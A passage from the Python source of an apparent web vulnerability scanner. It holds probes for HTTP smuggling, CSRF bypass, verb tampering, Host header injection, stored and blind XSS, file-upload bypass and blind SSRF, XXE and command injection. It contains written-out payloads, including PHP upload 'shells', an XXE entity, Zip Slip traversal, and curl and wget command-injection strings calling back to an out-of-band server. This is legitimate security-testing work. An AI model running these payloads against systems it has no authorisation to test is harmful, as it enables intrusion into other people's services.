                except socket.timeout:
                    elapsed = time.time() - t0
                    # Timeout itself is a strong desync signal
                    if elapsed > self.timeout * 0.8:
                        return FuzzResult(
                            url=url, method="POST",
                            param="Transfer-Encoding", param_type="header",
                            payload=name, vuln_type="http_smuggling",
                            finding=f"HTTP smuggling — timeout on {technique} probe (possible desync)",
                            severity="high",
                            resp_time_ms=elapsed * 1000,
                            status_code=0,
                        )
                    break

            elapsed = time.time() - t0
            resp_text = response_data.decode("utf-8", errors="replace")

            # Parse status code from raw response
            status_code = 0
            status_match = re.match(r"HTTP/\d\.\d\s+(\d+)", resp_text)
            if status_match:
                status_code = int(status_match.group(1))

            # ── Detection 1: Status code anomaly ──
            if status_code in (400, 500, 501, 502, 504, 505):
                return FuzzResult(
                    url=url, method="POST",
                    param="Transfer-Encoding", param_type="header",
                    payload=name, vuln_type="http_smuggling",
                    finding=(f"HTTP smuggling — {technique} probe returned "
                             f"{status_code} (server confused by CL/TE conflict)"),
                    severity="high",
                    resp_time_ms=elapsed * 1000,
                    status_code=status_code,
                )

            # ── Detection 2: Response body error patterns ──
            for pat, desc in detectors:
                if pat.search(resp_text):
                    return FuzzResult(
                        url=url, method="POST",
                        param="Transfer-Encoding", param_type="header",
                        payload=name, vuln_type="http_smuggling",
                        finding=f"HTTP smuggling — {desc} [{technique}: {name}]",
                        severity="high",
                        resp_time_ms=elapsed * 1000,
                        status_code=status_code,
                    )

            # ── Detection 3: Connection unexpectedly closed very fast ──
            if not response_data and elapsed < 1.0:
                return FuzzResult(
                    url=url, method="POST",
                    param="Transfer-Encoding", param_type="header",
                    payload=name, vuln_type="http_smuggling",
                    finding=(f"HTTP smuggling — connection immediately closed "
                             f"on {technique} probe (desync rejection)"),
                    severity="medium",
                    resp_time_ms=elapsed * 1000,
                    status_code=0,
                )

            return None

        except (ConnectionResetError, BrokenPipeError):
            # Connection reset is a strong desync indicator
            return FuzzResult(
                url=url, method="POST",
                param="Transfer-Encoding", param_type="header",
                payload=name, vuln_type="http_smuggling",
                finding=f"HTTP smuggling — connection reset on {technique} probe",
                severity="high",
                resp_time_ms=0,
                status_code=0,
            )
        except socket.timeout:
            return FuzzResult(
                url=url, method="POST",
                param="Transfer-Encoding", param_type="header",
                payload=name, vuln_type="http_smuggling",
                finding=f"HTTP smuggling — timeout on {technique} probe (possible desync)",
                severity="high",
                resp_time_ms=self.timeout * 1000,
                status_code=0,
            )
        except Exception:
            return None
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

    # ── CSRF Bypass Testing ──────────────────────────────────────────────────

    # Common CSRF token field name patterns
    _CSRF_FIELD_RE = re.compile(
        r'<input[^>]+name=["\']?([^"\'>\s]*(?:csrf|xsrf|token|authenticity[_-]token|'
        r'__RequestVerificationToken|antiforgery|_token|csrfmiddlewaretoken)[^"\'>\s]*)'
        r'["\']?[^>]+value=["\']?([^"\'>\s]*)["\']?',
        re.I,
    )

    _CSRF_META_RE = re.compile(
        r'<meta[^>]+(?:name|property)=["\']?(?:csrf-token|_csrf|_token|X-CSRF-TOKEN)'
        r'["\']?[^>]+content=["\']?([^"\'>\s]+)["\']?',
        re.I,
    )

    def _fuzz_csrf(self, surfaces: list):
        """
        Active CSRF bypass testing on form surfaces.

        Strategy:
        1. For each POST form surface, fetch the page to get the baseline form + token
        2. Submit the form normally (baseline — must succeed)
        3. For each bypass technique, re-submit with the bypass applied
        4. If the server accepts the request (not 403/400/token error), flag as CSRF bypass

        All probes use the SAME form data — only the token/headers are modified.
        This ensures no application state corruption beyond what the form normally does.
        """
        import uuid as _uuid

        # Deduplicate by form URL (don't test the same form action multiple times)
        seen_actions: set[str] = set()
        form_surfaces = [s for s in surfaces
                         if s.method == "POST" and s.param_type == "form"]

        for surface in form_surfaces:
            if self.stop_event.is_set() or time.time() > getattr(self, '_fuzz_deadline', float('inf')):
                return
            if surface.url in seen_actions:
                continue
            seen_actions.add(surface.url)

            # Step 1: Fetch the page that contains the form to extract token
            try:
                page_resp = self.session.get(
                    surface.url, timeout=self.timeout, verify=False,
                )
                if page_resp.status_code != 200:
                    continue
            except Exception:
                continue

            page_body = page_resp.text

            # Extract CSRF token from form or meta tag
            token_field = None
            token_value = None

            m = self._CSRF_FIELD_RE.search(page_body)
            if m:
                token_field = m.group(1)
                token_value = m.group(2)
            else:
                # Try meta tag
                meta_m = self._CSRF_META_RE.search(page_body)
                if meta_m:
                    token_value = meta_m.group(1)
                    # Common header names for meta-based CSRF
                    token_field = "X-CSRF-TOKEN"

            # Build baseline form data from surface
            form_data = {}
            if surface.body_template:
                for pair in surface.body_template.split("&"):
                    if "=" in pair:
                        k, v = pair.split("=", 1)
                        form_data[k] = v

            # If token found, add it to baseline
            if token_field and token_value:
                form_data[token_field] = token_value

            # Step 2: Baseline — submit form normally (should succeed)
            try:
                baseline_resp = self.session.post(
                    surface.url, data=form_data, timeout=self.timeout,
                    verify=False, allow_redirects=True,
                )
                baseline_status = baseline_resp.status_code
                baseline_body = baseline_resp.text[:10000]
            except Exception:
                continue

            # If baseline itself fails with 403/400, skip — form may need auth
            if baseline_status in (401, 403):
                continue

            # Step 3: Run each bypass technique
            probes = PAYLOADS.get("csrf", [])
            for probe in probes:
                if self.stop_event.is_set():
                    return

                technique = probe["technique"]
                name = probe["name"]

                try:
                    result = self._csrf_probe(
                        surface, form_data, token_field, token_value,
                        technique, name, baseline_status, baseline_body,
                    )
                    if result:
                        self.results.append(result)
                        break  # one CSRF finding per form is enough
                except Exception:
                    continue

                if self.rate_limit:
                    time.sleep(self.rate_limit)

    def _csrf_probe(
        self, surface, form_data: dict, token_field: str | None,
        token_value: str | None, technique: str, name: str,
        baseline_status: int, baseline_body: str,
    ) -> "FuzzResult | None":
        """Execute a single CSRF bypass probe and check if server accepted it."""
        import uuid as _uuid

        test_data = dict(form_data)  # copy
        extra_headers = {}
        method = "POST"
        content_type = "application/x-www-form-urlencoded"

        # ── Apply bypass technique ──
        if technique == "token_remove":
            if token_field and token_field in test_data:
                del test_data[token_field]
            else:
                return None  # no token to remove

        elif technique == "token_empty":
            if token_field and token_field in test_data:
                test_data[token_field] = ""
            else:
                return None

        elif technique == "token_random":
            if token_field:
                test_data[token_field] = _uuid.uuid4().hex
            else:
                return None

        elif technique == "token_null":
            if token_field:
                test_data[token_field] = "null"
            else:
                return None

        elif technique == "token_static":
            if token_field:
                test_data[token_field] = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
            else:
                return None

        elif technique == "token_short":
            if token_field and token_value:
                test_data[token_field] = token_value[:4]
            else:
                return None

        elif technique == "no_referer":
            extra_headers["Referer"] = ""

        elif technique == "wrong_referer":
            extra_headers["Referer"] = "https://evil.com/csrf-attack"

        elif technique == "null_origin":
            extra_headers["Origin"] = "null"

        elif technique == "wrong_origin":
            extra_headers["Origin"] = "https://evil.com"

        elif technique == "origin_subdomain":
            parsed = urlparse(surface.url)
            extra_headers["Origin"] = f"https://evil.{parsed.hostname}"

        elif technique == "method_get":
            # Convert POST to GET with params in query string
            method = "GET"

        elif technique == "method_override_header":
            extra_headers["X-HTTP-Method-Override"] = "GET"

        elif technique == "method_override_param":
            test_data["_method"] = "GET"

        elif technique == "content_type_plain":
            content_type = "text/plain"

        elif technique == "content_type_multipart":
            content_type = "multipart/form-data"

        elif technique == "combo_remove_null_origin":
            if token_field and token_field in test_data:
                del test_data[token_field]
            extra_headers["Origin"] = "null"

        elif technique == "combo_remove_no_referer_plain":
            if token_field and token_field in test_data:
                del test_data[token_field]
            extra_headers["Referer"] = ""
            content_type = "text/plain"

        # ── Send the probe ──
        try:
            headers = {"Content-Type": content_type}
            headers.update(extra_headers)

            if method == "GET":
                resp = self.session.get(
                    surface.url, params=test_data, headers=headers,
                    timeout=self.timeout, verify=False, allow_redirects=True,
                )
            elif content_type == "multipart/form-data":
                # Let requests handle multipart boundary
                resp = self.session.post(
                    surface.url, files={k: (None, v) for k, v in test_data.items()},
                    headers={k: v for k, v in headers.items() if k != "Content-Type"},
                    timeout=self.timeout, verify=False, allow_redirects=True,
                )
            else:
                resp = self.session.post(
                    surface.url, data=test_data, headers=headers,
                    timeout=self.timeout, verify=False, allow_redirects=True,
                )
        except Exception:
            return None

        resp_body = resp.text[:10000]

        # ── Detection: Did the server accept the request? ──
        # Check for rejection indicators first (protected)
        csrf_detectors = DETECTORS.get("csrf", [])
        for pat_str, desc in csrf_detectors:
            pat = re.compile(pat_str, re.I)
            if pat.search(resp_body):
                if "CSRF_PROTECTED" in desc:
                    # Server properly rejected — not vulnerable
                    return None

        # If server returned 403/400/422 — protected
        if resp.status_code in (400, 403, 419, 422):
            return None

        # Check if response looks like it succeeded
        # (similar status to baseline AND no rejection message)
        accepted = False

        # Same status as baseline
        if resp.status_code == baseline_status:
            accepted = True
        # Redirect (302/303) — often means form was processed
        elif resp.status_code in (200, 201, 302, 303):
            accepted = True

        if not accepted:
            return None

        # Additional confirmation: check for success patterns in body
        for pat_str, desc in csrf_detectors:
            pat = re.compile(pat_str, re.I)
            if pat.search(resp_body) and "CSRF_PROTECTED" not in desc:
                return FuzzResult(
                    url=surface.url, method=method,
                    param=token_field or "csrf_token",
                    param_type="form", payload=name,
                    vuln_type="csrf",
                    finding=(f"CSRF bypass — {name}: server accepted "
                             f"request ({resp.status_code}) — {desc}"),
                    severity="high",
                    resp_time_ms=0,
                    status_code=resp.status_code,
                )

        # Even without success pattern, if status matches baseline and
        # response body is substantially similar (not an error page),
        # it's likely vulnerable
        if (resp.status_code == baseline_status and
                len(resp_body) > 100 and
                abs(len(resp_body) - len(baseline_body)) / max(len(baseline_body), 1) < 0.5):
            return FuzzResult(
                url=surface.url, method=method,
                param=token_field or "csrf_token",
                param_type="form", payload=name,
                vuln_type="csrf",
                finding=(f"CSRF bypass — {name}: server returned same status "
                         f"({resp.status_code}) as baseline without valid token"),
                severity="high",
                resp_time_ms=0,
                status_code=resp.status_code,
            )

        return None

    def _fuzz_verb_tamper(self, surfaces: list):
        """
        HTTP verb tampering: try alternate methods on restricted endpoints
        to detect 403→200 access control bypass.
        """
        # Collect unique URLs that returned 403/401 during crawl or are POST-only
        candidates = list({s.url for s in surfaces})[:20]
        alt_methods = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "TRACE", "HEAD"]

        _dl = getattr(self, '_fuzz_deadline', float('inf'))
        for url in candidates:
            if self.stop_event.is_set() or time.time() > _dl:
                return
            # Get baseline with the original method
            try:
                baseline = self.session.get(url, timeout=self.timeout, verify=False,
                                            allow_redirects=False)
            except Exception:
                continue

            # Only test if baseline shows restriction
            if baseline.status_code not in (401, 403, 405):
                continue

            for method in alt_methods:
                if self.stop_event.is_set() or time.time() > _dl:
                    return
                time.sleep(self.rate_limit)
                try:
                    resp = self.session.request(method, url, timeout=self.timeout,
                                                verify=False, allow_redirects=False)
                except Exception:
                    continue

                # Success: originally restricted, now accessible
                if resp.status_code in (200, 201, 204, 301, 302) and resp.status_code != baseline.status_code:
                    finding = FuzzResult(
                        url=url, method=method, param="HTTP_METHOD",
                        param_type="method", payload=method,
                        vuln_type="method_tamper",
                        finding=(f"HTTP verb tampering bypass — {baseline.status_code} with GET "
                                 f"but {resp.status_code} with {method} [{url}]"),
                        severity="high",
                        resp_time_ms=0, status_code=resp.status_code,
                    )
                    with self._lock:
                        self.results.append(finding)
                    if self.on_finding:
                        self.on_finding(finding)
                    break  # one bypass per URL is enough

                # TRACE enabled — reflects request body (XST)
                if method == "TRACE" and resp.status_code == 200:
                    if "TRACE / " in resp.text or "trace" in resp.headers.get("content-type", ""):
                        finding = FuzzResult(
                            url=url, method="TRACE", param="HTTP_METHOD",
                            param_type="method", payload="TRACE",
                            vuln_type="method_tamper",
                            finding=f"TRACE method enabled — Cross-Site Tracing (XST) risk [{url}]",
                            severity="medium",
                            resp_time_ms=0, status_code=resp.status_code,
                        )
                        with self._lock:
                            self.results.append(finding)
                        if self.on_finding:
                            self.on_finding(finding)

    def _fuzz_host_header(self, surfaces: list):
        """
        Host header injection: test for cache poisoning, password reset poisoning,
        and SSRF via Host/X-Forwarded-Host manipulation.
        """
        candidates = list({s.url for s in surfaces})[:10]
        host_payloads = PAYLOADS.get("host_header", [])
        _dl = getattr(self, '_fuzz_deadline', float('inf'))

        for url in candidates:
            if self.stop_event.is_set() or time.time() > _dl:
                return

            # Get baseline response
            try:
                baseline = self.session.get(url, timeout=self.timeout, verify=False,
                                            allow_redirects=False)
                baseline_body = baseline.text[:4000]
            except Exception:
                continue

            for payload in host_payloads[:8]:
                if self.stop_event.is_set() or time.time() > _dl:
                    return
                time.sleep(self.rate_limit)

                headers = {"User-Agent": "Mozilla/5.0 (compatible; DAST-Scanner/1.0)"}

                # Some payloads are header names (X-Forwarded-Host etc)
                if payload.startswith("X-"):
                    hdr_name, _, hdr_val = payload.partition(": ")
                    headers[hdr_name] = hdr_val
                else:
                    headers["Host"] = payload

                try:
                    resp = self.session.get(url, headers=headers, timeout=self.timeout,
                                            verify=False, allow_redirects=False)
                except Exception:
                    continue

                resp_text = resp.text[:4000]

                # Check if injected value appears in response
                check_val = "evil.com"
                if check_val in resp_text and check_val not in baseline_body:
                    finding = FuzzResult(
                        url=url, method="GET", param="Host",
                        param_type="header", payload=payload,
                        vuln_type="host_header",
                        finding=(f"Host header injection — '{check_val}' reflected in response "
                                 f"after injecting Host: {payload} [{url}]"),
                        severity="high",
                        resp_time_ms=0, status_code=resp.status_code,
                    )
                    with self._lock:
                        self.results.append(finding)
                    if self.on_finding:
                        self.on_finding(finding)
                    return  # one finding per URL batch is enough

                # Check for X-Original-URL/X-Rewrite-URL path override
                if payload.startswith("X-Original-URL") or payload.startswith("X-Rewrite-URL"):
                    if resp.status_code in (200, 301, 302) and "/admin" in resp_text:
                        finding = FuzzResult(
                            url=url, method="GET", param=payload.split(":")[0],
                            param_type="header", payload=payload,
                            vuln_type="host_header",
                            finding=(f"Path override via {payload.split(':')[0]} — "
                                     f"/admin accessible [{url}]"),
                            severity="high",
                            resp_time_ms=0, status_code=resp.status_code,
                        )
                        with self._lock:
                            self.results.append(finding)
                        if self.on_finding:
                            self.on_finding(finding)
                        return

    def _fuzz_stored_xss(self, surface):
        """
        Stored XSS: inject payloads with unique canary tokens, then re-fetch
        the page to check if the payload persisted in the response body.

        Two-phase approach:
          1. INJECT: POST/PUT the payload with a unique canary
          2. VERIFY: GET the same URL (and redirect target) to look for the canary
        """
        import uuid

        templates = PAYLOADS.get("xss_stored", [])
        if not templates:
            return

        # Only run on writable surfaces (POST, PUT, PATCH)
        if surface.method in ("GET", "HEAD", "OPTIONS", "DELETE"):
            return

        # Collect canaries for batch verification
        injections: list[tuple[str, str, str]] = []  # (canary, payload, template)

        for template in templates[:8]:
            if self.stop_event.is_set():
                return

            canary  = f"DAST-SXSS-{uuid.uuid4().hex[:8]}"
            payload = template.replace("{CANARY}", canary)

            time.sleep(self.rate_limit)
            inject_resp = self._send_and_capture(surface, payload)

            if inject_resp is not None:
                injections.append((canary, payload, template))

                # Check if response itself reflects the canary (immediate reflection)
                try:
                    if canary in inject_resp.text:
                        # Check for redirect (302 → GET pattern)
                        loc = inject_resp.headers.get("location", "")
                        if loc and inject_resp.status_code in (301, 302, 303, 307, 308):
                            # Follow redirect and check
                            time.sleep(self.rate_limit)
                            try:
                                redir_resp = self.session.get(
                                    urljoin(surface.url, loc),
                                    timeout=self.timeout, verify=False,
                                    allow_redirects=False,
                                )
                                if canary in redir_resp.text:
                                    self._check_stored_canary(
                                        surface, canary, payload, template,
                                        redir_resp, urljoin(surface.url, loc),
                                    )
                            except Exception:
                                pass
                except Exception:
                    pass

        if not injections:
            return

        # ── Verification phase: re-fetch the form page to check persistence ──
        time.sleep(self.rate_limit * 3)  # brief delay for server-side persistence

        verify_urls = {surface.url}
        # Also check the page without query params (common for form submissions)
        parsed = urlparse(surface.url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        verify_urls.add(base_url)

        for vurl in verify_urls:
            if self.stop_event.is_set():
                return
            try:
                time.sleep(self.rate_limit)
                verify_resp = self.session.get(
                    vurl, timeout=self.timeout, verify=False, allow_redirects=True,
                )
                body = verify_resp.text

                for canary, payload, template in injections:
                    if canary in body:
                        self._check_stored_canary(
                            surface, canary, payload, template, verify_resp, vurl,
                        )
                        return  # one confirmed stored XSS per surface is enough
            except Exception:
                pass

    def _check_stored_canary(self, surface, canary: str, payload: str,
                             template: str, resp, verify_url: str):
        """Evaluate whether a persisted canary constitutes confirmed stored XSS."""
        body = resp.text

        # Check if the canary appears in an unescaped XSS context
        confirmed = False
        for pat in self._STORED_XSS_CONFIRM_PATTERNS:
            concrete = re.compile(pat.pattern.replace("{CANARY}", re.escape(canary)), re.I)
            if concrete.search(body):
                confirmed = True
                break

        if confirmed:
            severity = "high"
            finding_text = (
                f"STORED XSS CONFIRMED — payload persisted unescaped "
                f"[canary={canary}, param={surface.param}, "
                f"verified_at={verify_url}]"
            )
        else:
            severity = "low"
            finding_text = (
                f"Stored XSS potential — canary persisted (may be escaped) "
                f"[canary={canary}, param={surface.param}, "
                f"verified_at={verify_url}]"
            )

        proof_label, proof_data = None, None
        if self._proof_validator:
            try:
                proof_label, proof_data = self._proof_validator.validate(
                    "xss_stored", surface, verify_url, payload, resp)
            except Exception:
                pass
        if proof_label:
            finding_text = f"{proof_label} [{surface.url} | param={surface.param}]"

        url = self._build_url(surface, payload)
        headers = self._build_headers(surface, payload)
        body_req = self._build_body(surface, payload)
        eid = self._store_evidence(surface, "xss_stored", payload, url,
                                   headers, body_req or "", resp, 0.0)
        self._record_finding(surface, "xss_stored", payload, finding_text,
                             severity, url, dict(resp.headers), str(headers),
                             body[:10000], 0.0, resp.status_code, eid,
                             proof=proof_label, proof_data=proof_data)

    # ── OAST out-of-band injection & collection ────────────────────────────

    # Vuln types that benefit from OAST blind detection
    _OAST_VULN_TYPES = {
        "ssrf":      "critical",   # Blind SSRF — server fetches our callback
        "xxe":       "high",       # Blind XXE — XML parser fetches our entity
        "cmdi":      "critical",   # Blind CMDi — command executes callback
        "xss_blind": "high",       # Blind XSS — fires when admin renders stored content
    }

    # ── File-param name heuristic for upload surface detection ────────────────
    _UPLOAD_PARAM_RE = re.compile(
        r"(?i)\b(file|upload|image|img|photo|avatar|attachment|doc|document|"
        r"resume|cv|logo|icon|media|asset|content|picture|video|audio)\b"
    )
    _UPLOAD_URL_RE = re.compile(
        r"(?i)/(upload|file|attachment|media|asset|image|document|doc)[s/]"
    )

    def _upload_probe_specs(self) -> list[tuple[str, bytes, str, str, bool]]:
        """Build safety-filtered upload probes from built-ins and pattern packs."""
        zip_buf = io.BytesIO()
        with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("../../dast-zipslip-marker.txt", "DAST_ZIPSLIP_MARKER\n")

        probes: list[tuple[str, bytes, str, str, bool]] = [
            ("shell.php", b"<?php echo 'exec:' . phpversion(); ?>", "image/jpeg",
             "PHP extension uploaded with image/jpeg MIME type (MIME confusion)", True),
            ("shell.php\x00.jpg", b"<?php echo 'null-byte-exec:' . phpversion(); ?>", "image/jpeg",
             "Null-byte filename bypass: shell.php\\x00.jpg", True),
            ("../../dast-upload-marker.txt", b"DAST_TRAVERSAL_MARKER\n", "text/plain",
             "Path traversal in upload filename: ../../dast-upload-marker.txt", False),
            (
                "evil.svg",
                (
                    b'<?xml version="1.0" encoding="UTF-8"?>\n'
                    b'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>\n'
                    b'<svg xmlns="http://www.w3.org/2000/svg">'
                    b'<text id="xxe-test-marker">&xxe;</text></svg>'
                ),
                "image/svg+xml",
                "SVG upload with XXE payload targeting a low-sensitivity hostname file",
                True,
            ),
            ("shell.phtml", b"<?php echo 'phtml-exec:' . phpversion(); ?>", "image/jpeg",
             ".phtml extension bypass", True),
            ("shell.php5", b"<?php echo 'php5-exec:' . phpversion(); ?>", "image/jpeg",
             ".php5 extension bypass", True),
            ("shell.phar", b"<?php echo 'phar-exec:' . phpversion(); ?>", "image/jpeg",
             ".phar extension bypass", True),
            ("zipslip.zip", zip_buf.getvalue(), "application/zip",
             "Zip Slip: archive entry '../../dast-zipslip-marker.txt' traverses upload directory", False),
            (".htaccess", b"# DAST_HTACCESS_MARKER\n", "text/plain",
             ".htaccess control file upload accepted", False),
            ("shell.jpg.php", b"<?php echo 'double-ext-exec:' . phpversion(); ?>", "image/jpeg",
             "Double extension bypass: shell.jpg.php", True),
            ("shell.PHP", b"<?php echo 'uppercase-ext-exec:' . phpversion(); ?>", "image/jpeg",
             "Uppercase extension bypass: shell.PHP", True),
        ]

        for probe in UPLOAD_PROBE_EXTENSIONS:
            try:
                content = probe["content"]
                content_bytes = content.encode("utf-8") if isinstance(content, str) else bytes(content)
                probes.append((
                    str(probe["filename"]),
                    content_bytes,
                    str(probe.get("content_type", "application/octet-stream")),
                    str(probe.get("description", "External upload probe")),
                    bool(probe.get("requires_execution", False)),
                ))
            except Exception:
                continue

        return [
            probe for probe in probes
            if self._is_payload_safe(probe[0]) and self._is_payload_safe(probe[1])
        ]

    def _fuzz_upload_surfaces(self, surfaces: list):
        """
        Test file upload surfaces for dangerous bypass techniques:
        - MIME type confusion (.php served as image/jpeg)
        - Null-byte filename bypass (shell.php\x00.jpg)
        - Path traversal in filename
        - SVG with XXE payload
        - Alternate PHP extensions (.phtml, .php5, .phar)

        Selects surfaces where content_type is multipart/form-data,
        OR the param name looks like a file field,
        OR the URL path suggests an upload endpoint.
        Only records a finding when execution/exfiltration evidence is present.
        """
        _EXEC_EVIDENCE = re.compile(
            r"(?i)(root:.*:0:0:|uid=\d+\(|/bin/(bash|sh)|phtml-exec:|"
            r"php5-exec:|phar-exec:|xxe-test-marker|double-ext-exec:|uppercase-ext-exec:)"
        )
        _SUCCESS_HINTS = re.compile(
            r"(?i)(upload.*success|file.*saved|file.*stored|/uploads?/\w|"
            r"attachment.*created|stored.*successfully|zip.*extract|extract.*zip|archive.*stored)"
        )

        zip_buf = io.BytesIO()
        with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("../../dast-zipslip-marker.txt", "DAST_ZIPSLIP_MARKER\n")
        _zip_content = zip_buf.getvalue()

        # Dangerous upload probes: (filename, content_bytes, content_type, vuln_desc, check_exec)
        _probes = [
            (
                "shell.php",
                b"<?php echo 'exec:' . phpversion(); ?>",
                "image/jpeg",
                "PHP webshell uploaded with image/jpeg MIME type (MIME confusion)",
                True,
            ),
            (
                "shell.php\x00.jpg",
                b"<?php echo 'exec:' . phpversion(); ?>",
                "image/jpeg",
                "Null-byte filename bypass: shell.php\\x00.jpg (old PHP strips at null)",
                True,
            ),
            (
                "../../dast-upload-marker.txt",
                b"DAST_TRAVERSAL_MARKER\n",
                "text/plain",
                "Path traversal in upload filename: ../../dast-upload-marker.txt",
                False,  # success hint is enough for traversal
            ),
            (
                "evil.svg",
                (
                    b'<?xml version="1.0" encoding="UTF-8"?>\n'
                    b'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>\n'
                    b'<svg xmlns="http://www.w3.org/2000/svg">'
                    b'<text id="xxe-test-marker">&xxe;</text></svg>'
                ),
                "image/svg+xml",
                "SVG upload with XXE payload targeting a low-sensitivity hostname file",
                True,
            ),
            (
                "shell.phtml",
                b"<?php echo 'phtml-exec:' . phpversion(); ?>",
                "image/jpeg",
                ".phtml extension bypass (may execute as PHP on some servers)",
                True,
            ),
            (
                "shell.php5",
                b"<?php echo 'php5-exec:' . phpversion(); ?>",
                "image/jpeg",
                ".php5 extension bypass",
                True,
            ),
            (
                "shell.phar",
                b"<?php echo 'phar-exec:' . phpversion(); ?>",
                "image/jpeg",
                ".phar extension bypass",
                True,
            ),
            (
                "zipslip.zip",
                _zip_content,
                "application/zip",
                "Zip Slip: archive entry '../../dast-zipslip-marker.txt' traverses upload directory",
                False,  # server accepting the archive is the signal
            ),
            (
                ".htaccess",
                b"# DAST_HTACCESS_MARKER\n",
                "text/plain",
                ".htaccess control file upload accepted",
                False,  # acceptance into web root is the vulnerability
            ),
            (
                "shell.jpg.php",
                b"<?php echo 'double-ext-exec:' . phpversion(); ?>",
                "image/jpeg",
                "Double extension bypass: shell.jpg.php (server executes last extension)",
                True,
            ),
            (
                "shell.PHP",
                b"<?php echo 'uppercase-ext-exec:' . phpversion(); ?>",
                "image/jpeg",
                "Uppercase extension bypass: shell.PHP (case-insensitive validation bypass)",
                True,
            ),
        ]

        _probes = self._upload_probe_specs()

        seen_urls: set[str] = set()
        deadline = getattr(self, "_fuzz_deadline", float("inf"))

        for surface in surfaces:
            if self.stop_event.is_set() or time.time() > deadline:
                return
            if surface.method not in ("POST", "PUT", "PATCH"):
                continue
            if surface.url in seen_urls:
                continue

            # Select candidate surfaces
            is_multipart   = "multipart" in surface.content_type.lower()
            is_file_param  = bool(self._UPLOAD_PARAM_RE.search(surface.param))
            is_upload_url  = bool(self._UPLOAD_URL_RE.search(surface.url))
            if not (is_multipart or is_file_param or is_upload_url):
                continue

            seen_urls.add(surface.url)
            field_name = surface.param or "file"
            if (
                not self.allow_dangerous_endpoints
                and is_dangerous_endpoint(surface.method, surface.url, field_name)
            ):
                log.info(
                    "Upload probing skipped for sensitive endpoint: %s %s [%s]",
                    surface.method,
                    surface.url,
                    field_name,
                )
                continue

            for filename, content, content_type, vuln_desc, need_exec in _probes:
                if self.stop_event.is_set() or time.time() > deadline:
                    return
                time.sleep(self.rate_limit)

                try:
                    resp = self.session.request(
                        surface.method,
                        surface.url,
                        files={field_name: (filename, content, content_type)},
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=True,
                    )
                except Exception:
                    continue

                resp_text = resp.text[:10000]

                exec_hit    = bool(_EXEC_EVIDENCE.search(resp_text))
                success_hit = bool(_SUCCESS_HINTS.search(resp_text))

                confirmed = exec_hit or (not need_exec and success_hit)
                if not confirmed:
                    continue

                severity = "critical" if exec_hit else "high"
                finding_text = (
                    f"File upload bypass — {vuln_desc} "
                    f"[{surface.url} | field={field_name}]"
                )
                evidence_snippet = resp_text[:500]
                self._record_finding(
                    surface, "file_upload_bypass", filename,
                    finding_text, severity,
                    surface.url, dict(resp.headers), "",
                    evidence_snippet, 0.0, resp.status_code,
                )

    def _inject_oast_payloads(self, surface):
        """
        Inject OAST callback URLs as payloads for blind vulnerability detection.
        Generates unique tokens per injection so callbacks can be correlated.
        """
        param_vulns = self.PARAM_TYPE_MAP.get(surface.param_type, [])

        for vuln_type, sev in self._OAST_VULN_TYPES.items():
            if vuln_type not in param_vulns:
                continue
            if self.stop_event.is_set():
                return

            # ── Generate OOB callback URL via CollaboratorClient (preferred)
            #    or fall back to legacy OASTServer.make_url()
            if self._collaborator:
                _cp     = self._collaborator.generate_payload(vuln_type, surface.url, surface.param)
                oast_url = _cp.http_url
                dns_host = _cp.dns_host
                token    = _cp.payload_id
            else:
                oast_url = self.oast.make_url(vuln_type, surface.url, surface.param)
                dns_host = oast_url      # legacy: same base for HTTP and DNS
                token    = oast_url.rstrip("/").split("/")[-1]

            # Build vuln-specific payloads using the OAST callback URL
            oast_payloads: list[str] = []

            if vuln_type == "ssrf":
                oast_payloads = [
                    oast_url,
                    oast_url + "/ssrf-probe",
                    f"http://{dns_host}/ssrf-dns",   # DNS channel variant
                ]

            elif vuln_type == "xxe":
                oast_payloads = [
                    (
                        f'<?xml version="1.0"?><!DOCTYPE foo ['
                        f'<!ENTITY xxe SYSTEM "{oast_url}/xxe-probe">'
                        f']><x>&xxe;</x>'
                    ),
                    (
                        f'<?xml version="1.0"?><!DOCTYPE foo ['
                        f'<!ENTITY % xxe SYSTEM "{oast_url}/xxe-param">'
                        f'%xxe;]><x>test</x>'
                    ),
                ]

            elif vuln_type == "cmdi":
                oast_payloads = [
                    f"; curl {oast_url}/cmdi-curl ;",
                    f"| curl {oast_url}/cmdi-pipe",
                    f"& curl {oast_url}/cmdi-bg &",
                    f"`curl {oast_url}/cmdi-backtick`",
                    f"$(curl {oast_url}/cmdi-sub)",
                    f"; wget -q {oast_url}/cmdi-wget ;",
                    f"| wget -q -O- {oast_url}/cmdi-wget-pipe",
                ]

            elif vuln_type == "xss_blind":
                # Blind XSS — fires when admin/reviewer renders injected content out-of-band
                oast_payloads = [
                    f'<script src=//{oast_url}/xss-script></script>',
                    f'"><script src=//{oast_url}/xss-attr></script>',
                    f"'><img src=//{oast_url}/xss-img onerror=void(0)>",
                    f'<svg onload=fetch("//{oast_url}/xss-svg")>',
                    f'<img src=x onerror="new Image().src=\'//{oast_url}/xss-onerror\'">',
                    f'"><iframe src="javascript:fetch(\'//{oast_url}/xss-iframe\')">',
                ]

            # Track token → metadata for callback correlation
            with self._lock:
                self._oast_tokens[token] = {
                    "vuln_type": vuln_type,
                    "surface":   surface,
                    "severity":  sev,
                    "payloads":  [p[:80] for p in oast_payloads],
                }

            # Inject each OAST payload
            for payload in oast_payloads:
                if self.stop_event.is_set():
                    return
                time.sleep(self.rate_limit)
                self._send_and_capture(surface, payload)

    def _collect_oast_findings(self, wait: float = 5.0):
        """
        After all in-band fuzzing completes, wait briefly and check
        for any OAST callbacks that indicate blind vulnerabilities.

        Uses CollaboratorClient when available (typed Interaction objects with
        DNS/HTTP/SMTP channel detail).  Falls back to legacy OASTCallback path.
        """
        time.sleep(wait)  # give target servers time to make callbacks

        _VULN_LABELS = {
            "ssrf":      "Blind SSRF CONFIRMED",
            "xxe":       "Blind XXE CONFIRMED",
            "cmdi":      "Blind Command Injection CONFIRMED",
            "xss_blind": "Blind XSS CONFIRMED",
        }

        if self._collaborator:
            # ── Typed path: CollaboratorClient.get_interactions() ──────────────
